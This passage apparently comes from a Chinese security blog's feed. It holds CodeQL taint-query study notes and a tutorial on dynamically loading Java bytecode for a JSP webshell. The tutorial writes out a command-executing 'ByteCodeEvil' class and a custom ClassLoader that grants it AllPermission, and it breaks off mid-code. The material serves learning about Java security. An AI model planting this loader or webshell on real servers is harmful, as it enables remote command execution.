class="keyword">call</span> <span class="operator">|</span></span><br><span class="line">      method.hasName(&quot;query&quot;)</span><br><span class="line">      <span class="keyword">and</span></span><br><span class="line">      call.getMethod() <span class="operator">=</span> <span class="keyword">method</span> <span class="keyword">and</span></span><br><span class="line">      sink.asExpr() <span class="operator">=</span> call.getArgument(<span class="number">0</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isAdditionalTaintStep(DataFlow::Node node1, DataFlow::Node node2) &#123;</span><br><span class="line">    isTaintedString(node1.asExpr(), node2.asExpr())</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line"><span class="keyword">where</span> config.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> source.getNode(), source, sink, &quot;source&quot;</span><br></pre></td></tr></table></figure><h2 id="codeql进阶"><a href="#codeql进阶" class="headerlink" title="codeql进阶"></a>codeql进阶</h2><p>我们再上面的案例中看到了<code>instanceof</code>，如果我们去看codeql自带的规则库，会发现大量的<code>instanceof</code>语句</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207190246.png"></p><p>我们已经知道，可以使用exists(|)这种方式来定义source 和sink，但是如果，source&#x2F;sink特别复杂（比如，我们为了规则通用，可能要适配Springboot，Thrift RPC，Servlet等source），如果我们把这些都在一个子查询内完成，比如，condition 1 or condition 2 or condition3 ，这样就比较难维护，比较冗杂</p><p>instanceof给我们提供了一种机制，我们只需要定义一个abstract class，比如这个案例当中的:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** A data flow source of remote user input. */</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">RemoteFlowSource</span> <span class="keyword">extends</span> <span class="title class_">DataFlow</span>::Node &#123;</span><br><span class="line">  <span class="comment">/** Gets a string that describes the type of this remote flow source. */</span></span><br><span class="line">  <span class="keyword">abstract</span> string <span class="title function_">getSourceType</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再isSource方法里进行instanceof，判断src是RemoteFlowSource就可以了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">override predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node src)</span> &#123;</span><br><span class="line">    src <span class="keyword">instanceof</span> RemoteFlowSource</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的话，java和codeql会有一些不一样。</p><p>我们继承了一个abstract抽象类，但是没有实现方法，怎么获得source？</p><p>codeql的特性：只要继承了RemoteFlowSource类，那么所有的子类就会被调用，他所代表的source也会被加载。我们在RemoteFlowSource下可以看到非常多的子类，他们的结果都会被用and串联加载</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207202215.png"></p><h2 id="递归问题"><a href="#递归问题" class="headerlink" title="递归问题"></a>递归问题</h2><p>递归调用可以帮我们解决一类问题：我们不确定需要调用多少次方法才能得到我们想要的结果的时候，我们就可以选择递归调用</p><p>CodeQL里面的递归调用语法是：在谓词方法的后面跟*或者+，来表示调用0次以上和1次以上（和正则类似），0次会打印自己。</p><p>我们来举一个例子：</p><p>在java语言里，我们可以使用class嵌套class，多个内嵌class的时候，我们需要知道最外层的class是什么怎么办？</p><p>比如</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StudentService</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">innerOne</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">innerOne</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">class</span> <span class="title class_">innerTwo</span> &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="title function_">innerTwo</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">public</span> String <span class="title function_">Nihao</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Nihao&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">Hi</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们需要根据innnerTwo类定位到最外层的StudentService类，怎么办？</p><p>按照非递归的写法，我们可以这样做</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> Class classes</span><br><span class="line"><span class="keyword">where</span> classes.getName().toString() <span class="operator">=</span> &quot;innerTwo&quot;</span><br><span class="line"><span class="keyword">select</span> classes.getEnclosingType().getEnclosingType()   <span class="operator">/</span><span class="operator">/</span> getEnclosingtype获取作用域</span><br></pre></td></tr></table></figure><p>我们通过连续2次调用getEnclosingType方法是能够拿到最外层的StudentService的。</p><p>但正如我们开始所说，实际情况是我们并不清楚一开始有多少层外嵌，而且多个文件可能每个嵌套数量都不一样，我们没办法通过调用的次数来解决此问题，我们就需要用递归的方式去解决。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Class classes</span><br><span class="line"><span class="keyword">where</span> classes.getName().toString() <span class="operator">=</span> &quot;innerTwo&quot;</span><br><span class="line"><span class="keyword">select</span> classes.getEnclosingType<span class="operator">+</span>()   <span class="operator">/</span><span class="operator">/</span> 获取作用域</span><br></pre></td></tr></table></figure><p>也可以自己封装方法来调用</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">RefType demo(Class classes) &#123;</span><br><span class="line">    <span class="keyword">result</span> <span class="operator">=</span> classes.getEnclosingType()</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> Class classes</span><br><span class="line"><span class="keyword">where</span> classes.getName().toString() <span class="operator">=</span> &quot;innerTwo&quot;</span><br><span class="line"><span class="keyword">select</span> demo<span class="operator">*</span>(classes)   <span class="operator">/</span><span class="operator">/</span> 获取作用域</span><br></pre></td></tr></table></figure><h2 id="强制类型转换问题"><a href="#强制类型转换问题" class="headerlink" title="强制类型转换问题"></a>强制类型转换问题</h2><p>在CodeQL的规则集里，我们会看到很多类型转换的代码，比如：</p><p>打印所有方法的参数名称和类型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Parameter</span> param</span><br><span class="line"><span class="keyword">select</span> param, param.getType()</span><br></pre></td></tr></table></figure><p>换成如下语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> <span class="keyword">Parameter</span> param</span><br><span class="line"><span class="keyword">select</span> param, param.getType().(RefType)</span><br></pre></td></tr></table></figure><p>这样就强制转换成了RefType，意思就是从前面的结果中过滤出<code>RefType</code>的类型参数</p><blockquote><p>RefType是一种引用类型，就是去掉int等基本类型之后的数据</p></blockquote><blockquote><p>IntegralType  与上面相反的，必要类型</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211207214743.png"></p><h3 id="其他师傅的文章例子"><a href="#其他师傅的文章例子" class="headerlink" title="其他师傅的文章例子"></a>其他师傅的文章例子</h3><p><a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%88%96%E5%88%86%E6%9E%90%E5%AE%9E%E8%B7%B5/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8codeql%E6%8C%96%E6%8E%98CVE-2021-31856Meshery-sqli%E7%9A%84.html">https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%88%96%E5%88%86%E6%9E%90%E5%AE%9E%E8%B7%B5/%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8codeql%E6%8C%96%E6%8E%98CVE-2021-31856Meshery-sqli%E7%9A%84.html</a></p><p><a href="https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.html">https://ssst0n3.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E6%89%AB%E6%8F%8F/AST/codeql/codeql%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.html</a></p>]]></content>
    
    
    <summary type="html">对codeql的一些学习</summary>
    
    
    
    <category term="codeql" scheme="https://h0ld1rs.github.io/categories/codeql/"/>
    
    
    <category term="codeql" scheme="https://h0ld1rs.github.io/tags/codeql/"/>
    
  </entry>
  
  <entry>
    <title>java字节码加载的相关笔记</title>
    <link href="https://h0ld1rs.github.io/posts/42607.html"/>
    <id>https://h0ld1rs.github.io/posts/42607.html</id>
    <published>2022-03-11T12:34:06.000Z</published>
    <updated>2022-03-13T15:45:04.517Z</updated>
    
    <content type="html"><![CDATA[<h1 id="java加载字节码的相关笔记"><a href="#java加载字节码的相关笔记" class="headerlink" title="java加载字节码的相关笔记"></a>java加载字节码的相关笔记</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在java安全很多情况下都需要加载字节码来实现，这个实现离不开类加载器，也就是<code>ClassLoader</code></p><p>在p神 《java安全漫谈13》中提到到动态加载字节码的方式，这里结合<code>4ra1n</code>师傅的文章做一个总结</p><h2 id="0x01-自定义类加载器"><a href="#0x01-自定义类加载器" class="headerlink" title="0x01 自定义类加载器"></a>0x01 自定义类加载器</h2><p>这里是用于加载<code>JSP Webshell</code>的讨论</p><p>首先有一个加载的恶意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ByteCodeEvil</span> &#123;</span><br><span class="line">    String res;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ByteCodeEvil</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// 简单回显 Webshell</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(Runtime.getRuntime().exec(cmd).getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            stringBuilder.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res = stringBuilder.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 回显</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其编译为<code>Class</code>文件之后，还需要对其进行<code>Base64</code>编码，因为直接获取到的字节码是<code>byte[]</code>，为了避免在传输过程中的一些问题，我们选择将其转为<code>base64</code>编码</p><p>可以进行如下操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(ByteCodeEvil.class.getName());</span><br><span class="line">    <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line">    <span class="type">String</span> <span class="variable">bytes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(code);</span><br><span class="line">    System.out.println(bytes);</span><br></pre></td></tr></table></figure><blockquote><p>其中ClassPool属于<code>javassist</code>中的东西，我们需要导入依赖</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.24.0-GA&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></blockquote><p>最后可以获得<code>Base64</code>加密后的字节码</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220311210525.png"></p><p>之后我们需要从自定义的类加载器中将类加载出来，然后进行命令的执行，同时<code>ClassLoader</code>无法在运行时直接加载字节码</p><p>我们开始定义类加载器，一共需要三步：</p><ol><li>编写继承ClassLoader的抽象类</li><li>重写findClass()方法和defineClass()方法</li><li>在findClass()方法中调用调用<code>defineClass()</code>方法</li></ol><p>根据loadClass方法，首先会判断类是否已经被加载了(1)，如果没有，就会调用<code>loadClass</code>去加载(2)，如果还是没有找到，会调用<code>findBootstrapClassOrNull</code>方法。如果没有重写该方法的情况，默认是抛出异常。如果重写了该方法，则会自定义加载(3)</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220311234629.png"></p><p>开始重写方法</p><ol><li><p>重写<code>loadClass</code>方法的代码如下，当我们加载的是指定名称的类时，就调用重写后的<code>findClass</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (name.contains(<span class="string">&quot;ByteCodeEvil&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>重写<code>findClass</code></p><blockquote><p>在<code>findClass</code>中，如果调用<code>defineClass</code>加载指定的恶意字节码，就会达到运行时加载字节码的效果.</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>根据双亲委派机制完善<code>findClass</code></p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220311233314.png"></p></li></ol><blockquote><p>双亲委派机制</p><p>在java的类加载中，首先会检查该类是否已经被加载，若没有被加载，则会委托父加载器进行装载，只有当父加载器无法加载时，才会调用自身的<code>findClass()</code>方法进行加载。这样避免了子加载器加载一些试图冒名顶替可信任类的不可靠类，也不会让子加载器去实现父加载器实现的加载工作</p><p>例如用户使用自定义加载器加载<code>java.lang.Object</code>类，实际上委派给<code>BootstrapClassLoader</code>加载器。如果用户使用自定义类加载器加载<code>java.lang.Exp</code>类，父类无法加载只能交给自定义类加载器。由于同在<code>java.lang</code>包下，所以<code>Exp</code>类可以访问其他类的<code>protected</code>属性，可能涉及到一些敏感信息</p><p>因此必须将这个类与可信任类的访问域隔离，JVM中为了避免这样的危险操作，只允许由同一个类加载器加载的同一包内的类之间互相访问，这样一个由同一个类加载器加载的并属于同一个包的多个类集合称为运行时包</p><p>类加载体系为不同类加载器加载的类提供不同的命名空间，同一命名空间内的类可以互相访问，不同命名空间的类不知道彼此的存在</p></blockquote><p>除了命名空间的访问隔离和双亲委派的受信类保护，类加载器体系还用保护域来定义代码在运行时可以获得的权限</p><blockquote><p>每个class文件均和一个代码来源相关联，这个代码来源(<code>java.security.CodeSource</code>)通过URL类成员<code>location</code>指向代码库和对该class文件进行签名的零个或多个证书对象的数组。class文件在进行代码认证的过程中可能经过多个证书签名，也可能没有进行签名</p><p>访问控制策略<code>Policy</code>对权限的授予是以<code>CodeSource</code>为基础进行的，每个<code>CodeSource</code>拥有若干个<code>Permission</code>，这些<code>Permission</code>对象会被具体地以其子类描述，并且和<code>CodeSource</code>相关联的<code>Permission</code>对象将被封装在<code>java.security.PermissionCollection</code>类的一个子类实例中，以描述该<code>CodeSource</code>所获取的权限</p><p>类加载器的实现可以通过将代码来源(<code>CodeSource</code>)即代码库和该class文件的所有签名者信息，传递给当前的<code>Policy</code>对象的<code>getPermissions()</code>方法，来查询该代码来源所拥有的权限集合<code>PermissionCollection</code>(在策略初始化时生成)，并以此构造一个保护域传递给<code>defineClass()</code>以此指定类的保护域</p></blockquote><p>在jdk自带的源码中<code>defineClass</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len,</span><br><span class="line">                                     ProtectionDomain protectionDomain)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    protectionDomain = preDefineClass(name, protectionDomain);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进<code>PreDefineClass</code>可以看到当pd为空的时候，会返回默认的<code>defaultDomain</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ProtectionDomain <span class="title function_">preDefineClass</span><span class="params">(String name,</span></span><br><span class="line"><span class="params">                                            ProtectionDomain pd)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pd == <span class="literal">null</span>) &#123;</span><br><span class="line">            pd = defaultDomain;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> pd;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>再跟上默认的<code>defaultDomain</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="type">ProtectionDomain</span> <span class="variable">defaultDomain</span> <span class="operator">=</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="keyword">new</span> <span class="title class_">CodeSource</span>(<span class="literal">null</span>, (Certificate[]) <span class="literal">null</span>),</span><br><span class="line">                         <span class="literal">null</span>, <span class="built_in">this</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>同时，因为我们要往入写恶意类执行命令，所以我们需要最高权限</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PermissionCollection</span> <span class="variable">pc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">pc.add(<span class="keyword">new</span> <span class="title class_">AllPermission</span>());</span><br></pre></td></tr></table></figure><p>根据官方文档：The AllPermission is a permission that implies all other permissions</p><p>意味着该代码拥有全部的权限，也就是最高权限，也拥有<code>拥有</code>SocketPermission<code>和</code>FilePermission<code>这种敏感操作的权限</code></p><p>最后得到如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">PermissionCollection</span> <span class="variable">pc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">        pc.add(<span class="keyword">new</span> <span class="title class_">AllPermission</span>());</span><br><span class="line">        <span class="type">ProtectionDomain</span> <span class="variable">protectionDomain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="keyword">new</span> <span class="title class_">CodeSource</span>(<span class="literal">null</span>, (java.security.cert.Certificate[]) <span class="literal">null</span>), pc, <span class="built_in">this</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(name, bytes, <span class="number">0</span>, bytes.length, protectionDomain);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们放到<code>Test.java</code>试一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Evil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                <span class="keyword">if</span>(name.contains(<span class="string">&quot;ByteCodeEvil&quot;</span>))&#123;</span><br><span class="line">                    <span class="keyword">return</span> findClass(name);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.loadClass(name);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(<span 